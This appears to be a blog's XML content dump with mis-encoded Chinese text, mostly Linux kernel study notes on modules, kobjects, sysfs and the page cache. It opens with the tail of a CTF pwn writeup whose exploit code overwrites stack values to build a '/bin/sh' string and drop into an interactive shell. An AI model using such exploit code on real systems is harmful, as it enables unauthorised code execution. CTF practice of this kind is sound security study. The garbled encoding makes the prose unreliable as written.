old<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>new <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">,</span>new<span class="token punctuation">)</span>old <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'old'</span><span class="token punctuation">,</span> old<span class="token punctuation">)</span>write_stack<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> old<span class="token punctuation">,</span> <span class="token number">0x6873</span><span class="token punctuation">)</span>new <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'binsh'</span><span class="token punctuation">,</span>new<span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™é¢˜å…¶å®ä¹Ÿæ˜¯æŠ•æœºå–å·§å†™çš„ï¼Œæ­£ç»åº”è¯¥åƒsué‚£æ ·ï¼Œæ³„éœ²ç¨‹åºåŸè²Œ</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¾å¤‡ä¸æ¨¡å—</title>
      <link href="/2023/10/25/%E8%AE%BE%E5%A4%87%E4%B8%8E%E6%A8%A1%E5%9D%97/"/>
      <url>/2023/10/25/%E8%AE%BE%E5%A4%87%E4%B8%8E%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="è®¾å¤‡ä¸æ¨¡å—"><a href="#è®¾å¤‡ä¸æ¨¡å—" class="headerlink" title="è®¾å¤‡ä¸æ¨¡å—"></a>è®¾å¤‡ä¸æ¨¡å—</h1><p>è®¾å¤‡ç±»å‹ï¼šunixç³»ç»Ÿä¸ºäº†ç»Ÿä¸€å¸¸è§è®¾å¤‡ï¼Œè®¾å®šçš„ç±»å‹</p><p>æ¨¡å—</p><p>å†…æ ¸å¯¹è±¡</p><p>sysfsï¼šè¡¨ç¤ºè®¾å¤‡æ ‘çš„æ–‡ä»¶ç³»ç»Ÿ</p><h2 id="è®¾å¤‡ç±»å‹"><a href="#è®¾å¤‡ç±»å‹" class="headerlink" title="è®¾å¤‡ç±»å‹"></a>è®¾å¤‡ç±»å‹</h2><h3 id="å—è®¾å¤‡blkdevs"><a href="#å—è®¾å¤‡blkdevs" class="headerlink" title="å—è®¾å¤‡blkdevs"></a>å—è®¾å¤‡blkdevs</h3><h3 id="å­—ç¬¦è®¾å¤‡cdevs"><a href="#å­—ç¬¦è®¾å¤‡cdevs" class="headerlink" title="å­—ç¬¦è®¾å¤‡cdevs"></a>å­—ç¬¦è®¾å¤‡cdevs</h3><h3 id="ç½‘ç»œè®¾å¤‡"><a href="#ç½‘ç»œè®¾å¤‡" class="headerlink" title="ç½‘ç»œè®¾å¤‡"></a>ç½‘ç»œè®¾å¤‡</h3><p>ä¹Ÿç§°ä»¥å¤ªç½‘è®¾å¤‡ï¼Œæä¾›å¯¹ç½‘ç»œçš„è®¿é—®</p><p>ç‰©ç†é€‚é…å™¨+ç‰¹å®šçš„åè®®</p><p>æ‰“ç ´äº†unix ä¸€åˆ‡çš†æ–‡ä»¶çš„è®¾è®¡åŸåˆ™</p><p>é€šè¿‡socket apiè®¿é—®</p><h3 id="æ‚é¡¹è®¾å¤‡miscdevs"><a href="#æ‚é¡¹è®¾å¤‡miscdevs" class="headerlink" title="æ‚é¡¹è®¾å¤‡miscdevs"></a>æ‚é¡¹è®¾å¤‡miscdevs</h3><p>ç®€åŒ–çš„å­—ç¬¦è®¾å¤‡ï¼šç‰ºç‰²é€šç”¨æ€§ï¼Œæ¢å–ä½¿ç”¨çš„æ–¹ä¾¿</p><h3 id="è™šæ‹Ÿè®¾å¤‡"><a href="#è™šæ‹Ÿè®¾å¤‡" class="headerlink" title="è™šæ‹Ÿè®¾å¤‡"></a>è™šæ‹Ÿè®¾å¤‡</h3><p>å¯¹å†…æ ¸çš„åŠŸèƒ½æ‰©å±•ï¼Œä¼ªè®¾å¤‡pseudo devices</p><p>å¦‚éšæœºæ•°å‘ç”Ÿå™¨/dev/randomï¼Œç©ºè®¾å¤‡/dev/nullï¼Œé›¶è®¾å¤‡/dev/zero</p><h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello, world"></a>hello, world</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT â€œI bear a charmed life<span class="token punctuation">.</span>\nâ€<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** hello_exit â€“ the exit function, called when the module is removed.*/</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT â€œOut<span class="token punctuation">,</span> out<span class="token punctuation">,</span> brief candle<span class="token operator">!</span>\nâ€<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span>â€œGPLâ€<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span>â€œShakespeareâ€<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span>â€œA Hello<span class="token punctuation">,</span> World Moduleâ€<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>module_init()å’Œmodule_exit()éƒ½æ˜¯å®ï¼Œå”¯ä¸€å‚æ•°ä¸ºåˆå§‹åŒ–å‡½æ•°ï¼Œç±»å‹ä¸ºint my_init(void);</p><p>å¦‚æœè½½å…¥éGPLæ¨¡å—ï¼Œä¸èƒ½è¢«è°ƒè¯•ï¼Œä¸èƒ½è°ƒç”¨GPL_onlyç¬¦å·</p><p>å‰©ä¸‹ä¸¤ä¸ªæ²¡å•¥ç”¨</p><h3 id="æ„å»ºæ¨¡å—"><a href="#æ„å»ºæ¨¡å—" class="headerlink" title="æ„å»ºæ¨¡å—"></a>æ„å»ºæ¨¡å—</h3><p>2.6å†…æ ¸é‡‡ç”¨kbuildï¼Œæ„å»ºæ¨¡å—æ›´å®¹æ˜“ï¼Œç¬¬ä¸€æ­¥é€‰æ‹©å“ªé‡Œç®¡ç†æºç ï¼š</p><ol><li>æ¨¡å—æºç åŠ å…¥å†…æ ¸æºç æ ‘</li><li>å†…æ ¸ä»£ç æ ‘å¤–æ„å»ºæ¨¡å—æºç </li></ol><h3 id="å®‰è£…æ¨¡å—"><a href="#å®‰è£…æ¨¡å—" class="headerlink" title="å®‰è£…æ¨¡å—"></a>å®‰è£…æ¨¡å—</h3><h3 id="æ¨¡å—ä¾èµ–æ€§"><a href="#æ¨¡å—ä¾èµ–æ€§" class="headerlink" title="æ¨¡å—ä¾èµ–æ€§"></a>æ¨¡å—ä¾èµ–æ€§</h3><p>å¿…é¡»äº‹å…ˆç”Ÿæˆä¾èµ–å…³ç³»</p><pre><code>depmod</code></pre><p>ç”Ÿæˆä¾èµ–å…³ç³»ä¿¡æ¯</p><p>ä¾èµ–ä¿¡æ¯å­˜æ”¾åœ¨/lib/modules/version/modules.dep</p><h3 id="è½½å…¥æ¨¡å—"><a href="#è½½å…¥æ¨¡å—" class="headerlink" title="è½½å…¥æ¨¡å—"></a>è½½å…¥æ¨¡å—</h3><p>rootæƒé™ insmod</p><p>modprobeæä¾›äº†ä¾èµ–æ€§åˆ†æ</p><pre><code>modprobe module [ module paras ]</code></pre><h3 id="ç®¡ç†é…ç½®é€‰é¡¹"><a href="#ç®¡ç†é…ç½®é€‰é¡¹" class="headerlink" title="ç®¡ç†é…ç½®é€‰é¡¹"></a>ç®¡ç†é…ç½®é€‰é¡¹</h3><p>å¯¹äºè–ªèµ„ç›®å½•å»ºç«‹kconfig,è¦åœ¨å­˜åœ¨çš„kconfigæ–‡ä»¶ä¸­å¼•å…¥</p><p>source â€œdriver/char/fishing/Kconfigâ€</p><p>æ·»åŠ ä¸€ä¸ªé…ç½®é€‰é¡¹</p><pre><code>config FISHING_POLE tristate â€œFish Master 3000 supportâ€ default n helpIf you say Y here...</code></pre><p>æ·»åŠ ä¾èµ–å‹ï¼š</p><p>depends on FISH_TANK</p><p>é…ç½®ç³»ç»Ÿå…ƒé€‰é¡¹</p><p>CONFIG_BROKEN_ON_SMPï¼šé©±åŠ¨éå¤šå¤„ç†å™¨å®‰å…¨ï¼Œç”¨äºå‘ŠçŸ¥é£é™©</p><p>CONFIGâ€”â€”EXPERIMENTALï¼šå‘ŠçŸ¥é£é™©</p><h3 id="å‚æ•°æ¨¡å—"><a href="#å‚æ•°æ¨¡å—" class="headerlink" title="å‚æ•°æ¨¡å—"></a>å‚æ•°æ¨¡å—</h3><pre><code>module_param(name, type, perm);</code></pre><p>å®šä¹‰çš„å…¨å±€å˜é‡ï¼ŒåŒæ—¶å‡ºç°åœ¨sysfsæ–‡ä»¶ç³»ç»Ÿ</p><p>permåˆ¶å®šäº†sysfsä¸‹çš„æƒé™</p><p>ä¾‹å­</p><pre><code>static int allow_live_bait = 1; /* default to on */ module_param(allow_live_bait, bool, 0644); /* a Boolean type */</code></pre><p>å¤–éƒ¨å‚æ•°åä¸å†…éƒ¨ä¸åŒï¼š</p><pre><code>static unsigned int max_test = DEFAULT_MAX_LINE_TEST; module_param_named(maximum_line_test, max_test, int, 0);</code></pre><h3 id="å¯¼å‡ºç¬¦å·è¡¨"><a href="#å¯¼å‡ºç¬¦å·è¡¨" class="headerlink" title="å¯¼å‡ºç¬¦å·è¡¨"></a>å¯¼å‡ºç¬¦å·è¡¨</h3><p>å¯¼å‡ºå†…æ ¸å‡½æ•°ï¼Œæ‰èƒ½è¢«æ¨¡å—ç›´æ¥ä½¿ç”¨</p><p>éœ€è¦æŒ‡ä»¤EXPORT_SYMBOL()å’ŒEXPORT_SYMBOL_GPL()</p><pre><code>int get_pirate_beard_color(struct pirate *p) &#123;return p-&gt;beard.color; &#125; EXPORT_SYMBOL(get_pirate_beard_color);</code></pre><p>ç„¶åget_pirate_beard_colorå¯ä»¥è¢«æ‰€æœ‰æ¨¡å—è®¿é—®</p><p>ç¡®ä¿è‡ªå·±çš„æ¨¡å—ä½¿ç”¨çš„æ‰€æœ‰æ¥å£ï¼Œéƒ½è¢«å¯¼å‡º</p><h2 id="è®¾å¤‡æ¨¡å‹"><a href="#è®¾å¤‡æ¨¡å‹" class="headerlink" title="è®¾å¤‡æ¨¡å‹"></a>è®¾å¤‡æ¨¡å‹</h2><p>ç‹¬ç«‹æœºåˆ¶è¡¨ç¤ºè®¾å¤‡</p><ul><li>é‡å¤ä»£ç æœ€å°åŒ–</li><li>å¼•ç”¨è®¡æ•°è¿™æ ·çš„ç»Ÿä¸€æœºåˆ¶</li><li>æ‰€æœ‰è®¾å¤‡ä»¥æ ‘çš„å½¢å¼å‡ºç°</li><li>æ–¹ä¾¿å…³é—­ç”µæº</li></ul><h3 id="kobject"><a href="#kobject" class="headerlink" title="kobject"></a>kobject</h3><p>è®¾å¤‡æ¨¡å‹çš„æ ¸å¿ƒï¼Œç±»ä¼¼å¯¹è±¡</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> kobject <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>            <span class="token operator">*</span>name<span class="token punctuation">;</span>    <span class="token keyword">struct</span> list_head    entry<span class="token punctuation">;</span>    <span class="token keyword">struct</span> kobject         <span class="token operator">*</span>parent<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*æ„å»ºè®¾å¤‡æ ‘ï¼Œå³ä¸ºsysfs*/</span>    <span class="token keyword">struct</span> kset         <span class="token operator">*</span>kset<span class="token punctuation">;</span>     <span class="token keyword">struct</span> kobj_type     <span class="token operator">*</span>ktype<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sysfs_dirent <span class="token operator">*</span>sd<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*sysfsæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè¡¨ç¤ºkobjectçš„inode*/</span>    <span class="token keyword">struct</span> kref            kref<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*æä¾›å¼•ç”¨è®¡æ•°*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>é€šå¸¸åµŒå…¥åˆ«çš„ç»“æ„ä½“ï¼Œå¦‚struct cdev</p><p>kobjectåµŒå…¥å…¶å®ƒæœºæ„æ—¶ï¼Œè¯¥ç»“æ„æ‹¥æœ‰kobjectæä¾›çš„æ ‡å‡†åŠŸèƒ½</p><p>å¹¶æˆä¸ºå±‚æ¬¡æ¶æ„çš„ä¸€éƒ¨åˆ†</p><h3 id="ktype"><a href="#ktype" class="headerlink" title="ktype"></a>ktype</h3><p>kobject type, &lt;linux/kobject.h&gt;ä¸­</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> kobj_type <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> kobject <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/*ææ„å‡½æ•°*/</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> sysfs_ops         <span class="token operator">*</span>sysfs_ops<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//æè¿°sysfsè¯»å†™æ—¶çš„ç‰¹æ€§</span>    <span class="token keyword">struct</span> attribute             <span class="token operator">*</span><span class="token operator">*</span>default_attrs<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æè¿°äº†kobjectçš„é»˜è®¤å±æ€§</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><h3 id="kset"><a href="#kset" class="headerlink" title="kset"></a>kset</h3><p>kobjectå¯¹è±¡çš„é›†åˆä½“.æŠŠæ‰€æœ‰ç›¸å…³çš„kobjectæ”¾åˆ°åŒä¸€ä½ç½®</p><p>å°‘æ•°çš„ktype,å¤šä¸ªkset</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> kset <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     <span class="token keyword">struct</span> list_head         list<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//é“¾æ¥æ‰€æœ‰kobject</span>    spinlock_t                 list_lock<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//ä¿æŠ¤è¿™ä¸ªé“¾è¡¨ä¸­å…ƒç´ çš„è‡ªæ—‹é”</span>    <span class="token keyword">struct</span> kobject             kobj<span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//é›†åˆå…ƒç´ çš„åŸºç±»</span>    <span class="token keyword">struct</span> kset_uevent_ops     <span class="token operator">*</span>uevent_ops<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å¤„ç†é›†åˆä¸­kobjectçš„çƒ­æ’æ‹”æ“ä½œ</span>    <span class="token comment" spellcheck="true">// uevent:ç”¨æˆ·äº‹ä»¶çš„ç¼©å†™</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><h3 id="ç›¸äº’å…³ç³»"><a href="#ç›¸äº’å…³ç³»" class="headerlink" title="ç›¸äº’å…³ç³»"></a>ç›¸äº’å…³ç³»</h3><p>ç›¸åŒksetçš„kobjectä»¥ç‹¬ç«‹çš„ç›®å½•å‡ºç°åœ¨æ–‡ä»¶ç³»ç»Ÿ</p><h3 id="æ“ä½œç®¡ç†kobject"><a href="#æ“ä½œç®¡ç†kobject" class="headerlink" title="æ“ä½œç®¡ç†kobject"></a>æ“ä½œç®¡ç†kobject</h3><h3 id="å¼•ç”¨è®¡æ•°"><a href="#å¼•ç”¨è®¡æ•°" class="headerlink" title="å¼•ç”¨è®¡æ•°"></a>å¼•ç”¨è®¡æ•°</h3><p>ç±»ä¼¼inode</p><h2 id="sysfs"><a href="#sysfs" class="headerlink" title="sysfs"></a>sysfs</h2><p>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œæä¾›äº†kobjectå¯¹è±¡å±‚æ¬¡çš„è§†å›¾</p><p>æŒ‚è½½åœ¨sysç›®å½•ä¸‹</p><p>å°†kobjectä¸ç›®å½•é¡¹ç´§å¯†è”ç³»ï¼Œé€šè¿‡kobjectä¸­çš„dentryå®ç°</p><p>ç›®å½•devices</p><h3 id="åœ¨sysfsæ·»åŠ åˆ é™¤kobject"><a href="#åœ¨sysfsæ·»åŠ åˆ é™¤kobject" class="headerlink" title="åœ¨sysfsæ·»åŠ åˆ é™¤kobject"></a>åœ¨sysfsæ·»åŠ åˆ é™¤kobject</h3><h3 id="å‘sysfsæ·»åŠ æ–‡ä»¶"><a href="#å‘sysfsæ·»åŠ æ–‡ä»¶" class="headerlink" title="å‘sysfsæ·»åŠ æ–‡ä»¶"></a>å‘sysfsæ·»åŠ æ–‡ä»¶</h3><h4 id="1-é»˜è®¤å±æ€§"><a href="#1-é»˜è®¤å±æ€§" class="headerlink" title="1.é»˜è®¤å±æ€§"></a>1.é»˜è®¤å±æ€§</h4><p>ktypeä¸­åŒ…å«attributeç»“æ„ä½“ï¼Œå®šä¹‰åœ¨&lt;linux/sysfs.h&gt;</p><pre><code>struct attribute&#123;    const char         *name;        //å±æ€§åç§°ï¼Œå‡ºç°åœ¨sysfsä¸­çš„æ–‡ä»¶å    struct module    *owner;    mode_t            mode;        //sysfsä¸­è¯¥æ–‡ä»¶çš„æƒé™&#125;</code></pre><p>sysfs_opsæè¿°äº†å¦‚ä½•ä½¿ç”¨å±æ€§</p><p>show()è¯»å±æ€§,store()å†™å±æ€§</p><h4 id="2-åˆ›å»ºæ–°å±æ€§"><a href="#2-åˆ›å»ºæ–°å±æ€§" class="headerlink" title="2.åˆ›å»ºæ–°å±æ€§"></a>2.åˆ›å»ºæ–°å±æ€§</h4><pre><code>/*æ·»åŠ æ–°å±æ€§,æœ€ç»ˆå‡ºç°åœ¨sysfsä¸­çš„æ–‡ä»¶å*/int syss_create_file(struct kobject *kobj, const struct attribute *attr);/*åˆ›å»ºç¬¦å·é“¾æ¥*/int sysfs_create_link(struct kobject *kobj, struct kobject *target, char *name);/*åˆ é™¤æ–°å±æ€§*/void sysfs_remove_file(struct kobject *kobj, const struct attribute *attr);</code></pre><p>sysfsçº¦å®šï¼š</p><p>ä¿è¯æ¯ä¸ªæ–‡ä»¶å¯¼å‡ºä¸€ä¸ªå€¼ï¼Œæ–‡æœ¬å½¢å¼ï¼Œæ˜ å°„ä¸ºç®€å•Cç±»å‹</p><p>sysfsæ ‘å½¢çš„å®é™…ç”¨é€”å¾—çœ‹æºä»£ç </p><h3 id="17-4-3-å†…æ ¸äº‹ä»¶å±‚"><a href="#17-4-3-å†…æ ¸äº‹ä»¶å±‚" class="headerlink" title="17.4.3 å†…æ ¸äº‹ä»¶å±‚"></a>17.4.3 å†…æ ¸äº‹ä»¶å±‚</h3><p>å†…æ ¸åˆ°ç”¨æˆ·çš„æ¶ˆæ¯é€šçŸ¥ç³»ç»Ÿ</p><p>é€šè¿‡kobjectå’Œsysfsï¼Œèƒ½å¾ˆå¥½æ ‡è¯†æ—¶é—´çš„æº(ä¸€ä¸ªsysfsè·¯å¾„)</p><pre><code>int kobject_uevent(struct kobject *kobj, enum kobject_action action);</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‘é€ä¿¡å·çš„kobject</p><p>ç¬¬äºŒä¸ªä¸ºæè¿°ä¿¡å·çš„åŠ¨ä½œæˆ–åŠ¨è¯ï¼Œæšä¸¾ç±»å‹ï¼Œæ˜ å°„ç›¸åº”çš„å­—ç¬¦ä¸²</p>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¡µé«˜é€Ÿç¼“å­˜å’Œé¡µå›å†™</title>
      <link href="/2023/10/11/%E9%A1%B5%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%92%8C%E9%A1%B5%E5%9B%9E%E5%86%99/"/>
      <url>/2023/10/11/%E9%A1%B5%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%92%8C%E9%A1%B5%E5%9B%9E%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="the-Page-Cache-and-Page-Writeback"><a href="#the-Page-Cache-and-Page-Writeback" class="headerlink" title="the Page Cache and Page Writeback"></a>the Page Cache and Page Writeback</h1><p>page cache: ç£ç›˜cache,å‡å°‘ç£ç›˜IO</p><p>page writeback: page cacheå›å†™åˆ°disk</p><p>disk cacheçš„é‡è¦æ€§</p><ol><li>æé€Ÿ</li><li>å±€éƒ¨æ€§åŸç†</li></ol><h2 id="ç¼“å­˜æ‰‹æ®µ"><a href="#ç¼“å­˜æ‰‹æ®µ" class="headerlink" title="ç¼“å­˜æ‰‹æ®µ"></a>ç¼“å­˜æ‰‹æ®µ</h2><p>page cache:ç‰©ç†å†…å­˜ï¼Œå¯¹åº”ç£ç›˜çš„ç‰©ç†å—</p><p>sizeåŠ¨æ€</p><p>ç§°ä¸ºbacking storeï¼ˆåèƒŒå­˜å‚¨ï¼‰</p><p>å†…æ ¸æ‰§è¡Œè¯»æ“ä½œï¼Œå…ˆæ£€æŸ¥æ˜¯å¦åœ¨page cacheä¸­</p><p>ç¼“å­˜ä»¥é¡µä¸ºå•ä½ï¼Œè€Œä¸æ˜¯æ–‡ä»¶</p><h3 id="å†™ç¼“å­˜"><a href="#å†™ç¼“å­˜" class="headerlink" title="å†™ç¼“å­˜"></a>å†™ç¼“å­˜</h3><ol><li>ä¸ç¼“å­˜nowrite</li><li>å†™é€ç¼“å­˜write-throughï¼ŒåŒæ–¹éƒ½å†™</li><li>å›å†™write-back</li></ol><h3 id="ç¼“å­˜å›æ”¶-cache-eviction"><a href="#ç¼“å­˜å›æ”¶-cache-eviction" class="headerlink" title="ç¼“å­˜å›æ”¶ cache eviction"></a>ç¼“å­˜å›æ”¶ cache eviction</h3><p>å†³å®šæ’¤é”€å“ªäº›cacheçš„ç­–ç•¥</p><p>linux:é€‰cleané¡µ</p><p> clairvoyant algorithmé¢„æµ‹ç®—æ³•ï¼šæ— æ³•å®ç°</p><h4 id="1-æœ€è¿‘æœ€å°‘ä½¿ç”¨LRU"><a href="#1-æœ€è¿‘æœ€å°‘ä½¿ç”¨LRU" class="headerlink" title="1 æœ€è¿‘æœ€å°‘ä½¿ç”¨LRU"></a>1 æœ€è¿‘æœ€å°‘ä½¿ç”¨LRU</h4><h4 id="2-åŒé“¾ç­–ç•¥"><a href="#2-åŒé“¾ç­–ç•¥" class="headerlink" title="2 åŒé“¾ç­–ç•¥"></a>2 åŒé“¾ç­–ç•¥</h4><p>æ´»è·ƒé“¾è¡¨active list:ä¸å¯æ¢å‡º</p><p>inactive list</p><p>ä¸¤ä¸ªé“¾è¡¨éœ€è¦ç»´æŒå¹³è¡¡ï¼Œè§£å†³äº†LRUç®—æ³•ä»…å¯¹ä¸€æ¬¡è®¿é—®çš„çª˜å¢ƒ</p><p>ç§°ä¸ºLRU/2,ä¹Ÿå¯æ‰©å±•åˆ°nä¸ªé“¾è¡¨LRU/n</p><h2 id="linux-page-cache"><a href="#linux-page-cache" class="headerlink" title="linux page cache"></a>linux page cache</h2><h3 id="address-space-å¯¹è±¡"><a href="#address-space-å¯¹è±¡" class="headerlink" title="address_space å¯¹è±¡"></a>address_space å¯¹è±¡</h3><p>page cacheä¸­çš„ä¸€å¤œå¯ä»¥åŒ…å«å¤šä¸ªä¸è¿ç»­çš„ç‰©ç†å—</p><p>ç”±äºä¸è¿ç»­æ€§ï¼Œæ£€æŸ¥ä¸€ä¸ªæ•°æ®æ˜¯å¦åœ¨cacheä¸­ä¸å®¹æ˜“</p><p>ä¸èƒ½ç›´æ¥ç”¨è®¾å¤‡å+å—å·å¯»æ‰¾cache</p><p>å¯ä»¥ç”¨page cacheæ‰©å±•inode ç»“æ„ä½“ï¼šä¼šè®©page cache å±€é™äºæ–‡ä»¶</p><p>ä¸ºäº†ç»´æŒæ™®éæ€§ï¼Œé‡‡ç”¨address_spaceç»“æ„ä½“</p><p>æ˜¯vm_area_structçš„ç‰©ç†åœ°å€å¯¹ç­‰ä½“</p><p>ä¸€ä¸ªæ–‡ä»¶å¯ä»¥è¢«10ä¸ªvm_area_structæ ‡è¯†ï¼Œä½†åªèƒ½è¢«ä¸€ä¸ªaddres_spaceæ ‡è¯†</p><p>æ–‡ä¸å¯¹é¢˜ï¼Œåº”è¯¥å«page_cache_entityæˆ–physical_pages_of_a_file</p><p>å®šä¹‰åœ¨&lt;linux/fs.h&gt;</p><pre><code>struct address_space&#123;    struct inode            *host;    ...    struct prio_tree_root     i_mmap;&#125;</code></pre><p>i_mmapæ‰€æœ‰è¿™ä¸ªaddress spaceå†…çš„æ˜ å°„çš„æœ‰é™æœç´¢æ ‘</p><p>å¾€å¾€ä¼šå’Œä¸€äº›å†…æ ¸å¯¹è±¡å…³è”ï¼Œé€šå¸¸æƒ…å†µä¸‹å’Œä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹å…³è”inode</p><p>æ­¤æ—¶hoståŸŸæŒ‡å‘ç´¢å¼•èŠ‚ç‚¹</p><p>å’Œswapperå…³è”ï¼ŒhoståŸŸç½®ä¸ºNULL</p><h3 id="address-space-æ“ä½œ"><a href="#address-space-æ“ä½œ" class="headerlink" title="address_space æ“ä½œ"></a>address_space æ“ä½œ</h3><p>readpage()å’Œwritepage()æœ€é‡è¦</p><p>è¯»æ“ä½œåŒ…å«çš„æ­¥éª¤ï¼š</p><p>åœ¨é¡µé«˜é€Ÿç¼“å­˜æ‰¾åˆ°éœ€è¦çš„æ•°æ®,find_get_pageè´Ÿè´£å®Œæˆ</p><pre><code>page = find_get_page(address_space mapping, offset index)</code></pre><p>å¦‚æœæœç´¢çš„é¡µä¸åœ¨cacheï¼Œä¼šè¿”å›NULLï¼Œå¹¶åˆ†é…æ–°é¡µé¢åŠ å…¥cache</p><p>éœ€è¦çš„æ•°æ®ä»ç£ç›˜ä¸­è¯»å…¥ï¼Œå†å†™åˆ°page cacheä¸­ï¼Œç„¶åè¿”å›ç»™ç”¨æˆ·</p><pre><code>error = mapping-&gt;a_ops_readpage(file, page);</code></pre><p>å†™æ“ä½œå¯¹äºmappingåªéœ€è¦</p><pre><code>SetPageDirty(page);</code></pre><p>æ™šäº›æ—¶å€™è°ƒç”¨writepage()</p><pre><code>// åœ¨page_cahceä¸­æœç´¢é¡µpage = __grab_cache_page(mapping, index, &amp;cached_page, &amp;lru_pvec); // åˆ›å»ºå†™è¯·æ±‚status = a_ops-&gt;prepare_write(file, page, offset, offset+bytes); // å†™æ•°æ®ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´page_fault = filemap_copy_from_user(page, offset, buf, bytes); // pageå†™å…¥ç£ç›˜status = a_ops-&gt;commit_write(file, page, offset, offset+bytes);</code></pre><h3 id="åŸºæ ‘-radix-tree"><a href="#åŸºæ ‘-radix-tree" class="headerlink" title="åŸºæ ‘ radix tree"></a>åŸºæ ‘ radix tree</h3><p>ä»»ä½•é¡µIOæ“ä½œå‰ï¼Œå†…æ ¸éƒ½è¦æ£€æŸ¥é¡µæ˜¯å¦åœ¨cache</p><p>å› æ­¤æŸ¥æ‰¾å¿…é¡»é«˜æ•ˆ</p><p>æ¯ä¸ªaddress_spaceå¿…é¡»æœ‰å”¯ä¸€çš„åŸºæ ‘ï¼Œä¿å­˜åœ¨page_treeç»“æ„ä½“</p><p>åŸºæ ‘æ˜¯äºŒå‰æ ‘ï¼Œåªè¦æŒ‡å®šåç§»é‡ï¼Œå°±èƒ½è¿…é€Ÿæ£€ç´¢ï¼Œfind_get_pageè°ƒç”¨radix_tree_lookup()</p><p>æ ¸å¿ƒä»£ç åœ¨lib/radix-tree.cä¸­</p><h3 